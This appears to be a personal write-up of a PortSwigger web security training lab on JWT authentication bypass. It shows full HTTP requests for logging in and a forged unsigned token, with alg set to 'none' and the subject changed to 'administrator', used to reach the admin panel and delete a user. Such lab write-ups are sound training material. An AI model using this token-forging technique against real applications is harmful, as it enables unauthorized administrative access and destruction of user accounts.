---
tags:
  - jwt
---
# JWT authentication bypass via unverified signature

## Instructions

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

!!! note "Oops"
	I didn't actually need to do a "none" attack for this lab. I could have just modified the claim and it would have worked. My bad.

Note that when we log in, the application response sets a session cookie containing a JWT.

```text title="Initial login"
POST /login HTTP/1.1
Host: 0a710037039dbd7b806edf7600ba006d.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://0a710037039dbd7b806edf7600ba006d.web-security-academy.net
Connection: keep-alive
Referer: https://0a710037039dbd7b806edf7600ba006d.web-security-academy.net/login
Cookie: session=
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: magenta
Priority: u=0, i

csrf=5Ydx3dB54Cj0NqCzxKoWJPuChby9gwAU&username=wiener&password=peter
```

```text title="Initial response" hl_lines="3"
HTTP/1.1 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=eyJraWQiOiI0MzhkY2UxMy1iN2VmLTQyNjctYjNiZS00ZGM3MWUyNTIyMmQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1MjUxNCwic3ViIjoid2llbmVyIn0.Kh7zwr8S6dlqGB5q0IoCNaOFwjywtwbG8zKisZmQyHUM9nKFEwR8dV13upszlS-8sOu8869fuDGZjowEqYTX0NW3yAbCSRHie6bjcdMlsaK-rkaEKi78dsSDQCGdoXCQoDG6fH41v1V1HHWEfSj-9w2ZcA4lHoErt8eS5tPgTj9fSCSJxf39b62U_sOmR166lVVmvC6qvk2zkm9JPUXklggdOcJFA-v2bsOXWNOqHAImx9denNl9cCE9bPB9yE4X18qp8lxryFGFXZ6-wcxcSwK-DtawfwxJY3-0cRwlzqrjQvSnftF0j6eZHrfstrDNQ5Bbya_pqWiYzLQBnPE9lw; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Encoding: gzip
Connection: close
Content-Length: 0
```

The following shows the decoded JWT:

![](../../../../../site/_drafts/labs/PortSwigger/JWT/attachments/jwt-lab-1/file-20251124113610533.webp)

We can use a "none" algorithm attack to see if the application will accept a JWT with no signature. 

The following shows the updated token. Note that I changed the user from "wiener" to "administrator".

![](../../../../../site/_drafts/labs/PortSwigger/JWT/attachments/jwt-lab-1/file-20251124113610534.webp)

Swapping out that new token in replay and changing the account id from "wiener" to "administrator" in the query string works for accessing the administrator's account. 

![](../../../../../site/_drafts/labs/PortSwigger/JWT/attachments/jwt-lab-1/file-20251124113610535.webp)

Now we can access the /admin/delete endpoint, and can delete carlos to solve the lab. 

```text title="Final request to delete carlos" hl_lines="10"
GET /admin/delete?username=carlos HTTP/1.1
Host: 0a710037039dbd7b806edf7600ba006d.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a710037039dbd7b806edf7600ba006d.web-security-academy.net/login
Connection: keep-alive
Cookie: session=eyJraWQiOiI0MzhkY2UxMy1iN2VmLTQyNjctYjNiZS00ZGM3MWUyNTIyMmQiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1MjUxNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-PwnFox-Color: magenta
Priority: u=0, i


```

This solves the lab.

## Lesson learned

Always check if the application is validating the JWT signature. Can we modify claims without having a valid signing key?